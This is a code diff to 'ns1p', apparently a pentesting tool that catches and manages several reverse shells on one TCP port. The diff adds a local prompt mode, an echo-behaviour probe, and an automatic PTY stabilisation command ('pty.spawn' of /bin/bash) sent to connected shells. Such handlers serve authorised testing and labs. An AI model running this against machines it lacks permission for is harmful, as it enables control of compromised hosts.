@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import sys
+import os
 import traceback
 import time
 import termios
@@ -10,18 +11,26 @@ import select
 import collections
 import asyncio
 
+from prompt_toolkit import PromptSession
+from prompt_toolkit.history import FileHistory as PromptFileHistory
+from prompt_toolkit.key_binding import KeyBindings as PromptKeyBindings
+from prompt_toolkit.patch_stdout import patch_stdout as prompt_patch_stdout
+from prompt_toolkit import print_formatted_text as prompt_print_formatted_text, ANSI as PromptANSI
+
 import textual
 from textual import events
 from textual.app import App, ComposeResult
 from textual.widgets import Static, ListView, ListItem, Label, RichLog
 
 class ShellSession:
-    def __init__(self, session_id, name, reader, writer):
+    def __init__(self, session_id, name, reader, writer, local_prompt_mode=False):
         self.session_id = session_id
         self.name = name
         self.reader = reader
         self.writer = writer
+        self.local_prompt_mode = False
         self.read_deque = collections.deque()
+        self.ready = False
 
 class NShellsOnePortApp(App):
     """Accepts N reverse shell on one tcp port"""
@@ -31,8 +40,8 @@ class NShellsOnePortApp(App):
         self.session_list_view = None
         self.next_session_id = 0
         self.write_lock = asyncio.Lock()
-
-        self.readline_mode = False
+        self.menu = True
+        self.prompt_session = None
 
         yield Static("ns1p - N Shells 1 Port")
 
@@ -45,43 +54,101 @@ class NShellsOnePortApp(App):
     async def on_list_view_selected(self, event: ListView.Selected):
         session_id = int(event.item.id.split('session_')[1])
         session = next(s for s in self.session_list if s.session_id == session_id)
-        self.log_view.write(f"[*] Selected session {session.name}")
-        with self.suspend(), RawStdin():
-            def console_data_loop():
-                menu = False
+        if not session.ready:
+            self.log_view.write(f"[!] Session {session.name} selected before it was ready")
+            return
+        self.log_view.write(f"[*] Session {session.name} selected")
+        with self.suspend():
+            async def local_prompt_mode_console_loop():
+                prompt_history = PromptFileHistory(os.path.join(os.path.expanduser("~"), ".ns1p_local_prompt_history"))
+                prompt_key_bindings = PromptKeyBindings()
 
-                try:
-                    # TODO: implement a history function
-                    while not menu and session in self.session_list:
+                @prompt_key_bindings.add('c-b')
+                def _(event):
+                    self.menu = True
+                    self.prompt_session.app.exit()
+
+                @prompt_key_bindings.add('c-c')
+                def _(event):
+                    if event.current_buffer.document.text == "":
+                        session.writer.write(b"\x03")
+                    else:
+                        event.current_buffer.reset()
+
+                @prompt_key_bindings.add('c-d')
+                def _(event):
+                    session.writer.write(event.current_buffer.document.text.encode("utf-8"))
+                    session.writer.write(b"\x04")
+                    event.current_buffer.reset(append_to_history=True)
+
+                self.prompt_session = PromptSession(history=prompt_history, key_bindings=prompt_key_bindings)
+
+                async def stdout_loop():
+                    while not self.menu and session in self.session_list:
                         try:
-                            data = session.read_deque.popleft()
-                            data = data.replace(b'\n', b'\r\n')
-                            sys.stdout.buffer.write(data)
-                            sys.stdout.buffer.flush()
+                            data = session.read_deque.popleft().decode("utf-8")
+                            prompt_print_formatted_text(PromptANSI(data))
                         except IndexError:
                             pass
+                        await asyncio.sleep(0) #yield to event loop
 
-                        if self.readline_mode:
-                            pass
-                        else: #raw mode
+                    # cancel prompt
+                    self.prompt_session.app.exit()
+
+                with prompt_patch_stdout():
+                    self.prompt_session.app.create_background_task(stdout_loop())
+                    self.menu = False
+
+                    try:
+                        # TODO: implement a history function
+                        while not self.menu and session in self.session_list:
+                            line = await self.prompt_session.prompt_async("ns1p> ")
+                            if line:
+                                line = line.encode("utf-8")
+                                session.writer.write(line + b"\n")
+
+                        self.prompt_session = None
+
+                    except Exception as e:
+                        self.log_view.write(f"[-] Exception in local_prompt_mode_console_loop: {e}\n{traceback.format_exc()}")
+
+            def raw_mode_console_loop():
+                with RawStdin():
+                    self.menu = False
+
+                    try:
+                        # TODO: implement a history function
+                        while not self.menu and session in self.session_list:
+                            try:
+                                data = session.read_deque.popleft()
+                                data = data.replace(b'\n', b'\r\n')
+                                sys.stdout.buffer.write(data)
+                                sys.stdout.buffer.flush()
+                            except IndexError:
+                                pass
+
                             # stdin read is non blocking because we disabled Canonical Mode and set VMIN=VTIME=0
                             b = sys.stdin.buffer.read(1)
                             if len(b) > 0:
                                 if b == b'\x02': #STX aka Ctrl-B
-                                    menu = True
+                                    self.menu = True
                                 else:
                                     session.writer.write(b)
-                except Exception as e:
-                    self.log_view.write(f"[-] Exception in console_data_loop: {e}\n{traceback.format_exc()}")
+                    except Exception as e:
+                        self.log_view.write(f"[-] Exception in raw_mode_console_loop: {e}\n{traceback.format_exc()}")
+
             # WARNING: this also seems to silence errors
-            await asyncio.get_running_loop().run_in_executor(None, console_data_loop)
+            if session.local_prompt_mode:
+                await local_prompt_mode_console_loop()
+            else:
+                await asyncio.get_running_loop().run_in_executor(None, raw_mode_console_loop)
 
     async def on_ready(self) -> None:
         self.log_view.write("Welcome to ns1p - N Shells 1 Port")
         self.log_view.write("Connect a reverse shell and use the arrow keys to select a session")
         self.log_view.write("Use the enter key to interact with a session")
         self.log_view.write("You can bring up this menu at any time by pressing Ctrl-B")
-        self.log_view.write("In readline mode it may be necessary to submit a line containing Ctrl-B (\\x03) using the enter key")
+        self.log_view.write("In local prompt mode it may be necessary to submit a line containing Ctrl-B (\\x03) using the enter key")
         self.log_view.write("")
         self.run_worker(self.master_server())
 
@@ -129,40 +196,45 @@ class NShellsOnePortApp(App):
                 stdin_live_echo = False
                 stdin_late_echo = False
                 command_echo = False
+                immediate_execution = False
                 writer.write(b"echo ns1p")
                 await writer.drain()
                 data = await read_stream(reader, timeout=.5)
 
-                if not data:
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does NOT live-echo inputs")
-                elif b"echo ns1p" in data:
+                if data and b"echo ns1p" in data:
                     self.log_view.write(f"[*] Session {session_id}: Reverse shell does live-echo inputs")
                     stdin_live_echo = True
+                elif data and (b"ns1p\n" in data or b"ns1p\r\n" in data):
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does NOT live-echo inputs. It also executes on immediately upon receive")
+                    command_echo = True
+                    immediate_execution = True
                 else:
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data)")
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does NOT live-echo inputs")
 
-                writer.write(b"\n")
-                await writer.drain()
-                data = await read_stream(reader)
 
-                if not data:
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with no response)")
-                elif not stdin_live_echo and b"ns1p" in data and not b"echo ns1p" in data:
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands but doesn't echo inputs")
-                    command_echo = True
-                elif b"echo ns1p" in data and data.count(b"ns1p") >= 2:
-                    stdin_late_echo = True
-                    command_echo = True
-                    if not stdin_live_echo:
-                        self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs but only after sending newline")
-                        # cmd.exe and powershell echos the command only after pressing enter
+                if not immediate_execution:
+                    writer.write(b"\n")
+                    await writer.drain()
+                    data = await read_stream(reader)
+
+                    if not data:
+                        self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with no response)")
+                    elif not stdin_live_echo and b"ns1p" in data and not b"echo ns1p" in data:
+                        self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands but doesn't echo inputs")
+                        command_echo = True
+                    elif b"echo ns1p" in data and data.count(b"ns1p") >= 2:
+                        stdin_late_echo = True
+                        command_echo = True
+                        if not stdin_live_echo:
+                            self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs but only after sending newline")
+                            # cmd.exe and powershell echos the command only after pressing enter
+                        else:
+                            self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs live AND after sending newline")
+                    elif stdin_live_echo and data.count(b"ns1p") >= 1: #theoretically we should check == 1 but the count might be higher from e.g. PS1
+                        self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands and live-echos inputs")
+                        command_echo = True
                     else:
-                        self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs live AND after sending newline")
-                elif stdin_live_echo and data.count(b"ns1p") >= 1: #theoretically we should check == 1 but the count might be higher from e.g. PS1
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands and live-echos inputs")
-                    command_echo = True
-                else:
-                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data: {data})")
+                        self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data: {data})")
 
                 # Ctrl-C check
 
@@ -191,26 +263,31 @@ class NShellsOnePortApp(App):
                 await writer.drain()
                 await read_stream(reader)
 
-                self.log_view.write(f"[*] Session {session_id}: shell_feature_check concluded. Result (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = {(stdin_live_echo, stdin_late_echo, command_echo, ctrl_c)}")
-                return (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c)
+                self.log_view.write(f"[*] Session {session_id}: shell_feature_check concluded. Result (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = {(stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution)}")
+                return (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution)
 
-            (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = await shell_feature_check()
+            (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = await shell_feature_check()
             # this check in its current form does not stabilize on a pure bash reverse shell => no Ctrl-C
             # it also attempts to linux stabilize a windows shell (although this doesnt break anything)
-            if command_echo and not (stdin_live_echo and ctrl_c) and not stdin_late_echo:
+            if immediate_execution:
+                # input is executed by the remote immediately after receiving => local_prompt_mode required
+                session.local_prompt_mode = True
+                self.log_view.write(f"[*] Session {session_id}: local prompt mode enabled")
+            elif command_echo and not (stdin_live_echo and ctrl_c) and not stdin_late_echo:
                 self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
                 writer.write(b"exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
                 await writer.drain()
-                (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = await shell_feature_check()
+                (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = await shell_feature_check()
             elif command_echo and stdin_late_echo and not (stdin_live_echo or ctrl_c):
-                # this is most likely a windows shell
-                # enable readline mode
-                pass
-            # TODO: have some kind of readline mode
+                # this is most likely a windows shell with only late echo => local_prompt_mode preferred to not type blind
+                session.local_prompt_mode = True
+                self.log_view.write(f"[*] Session {session_id}: local prompt mode enabled")
 
             # send a final newline to print PS1 again
             writer.write(b"\n")
             await writer.drain()
+
+            session.ready = True
 
             try:
                 while True:
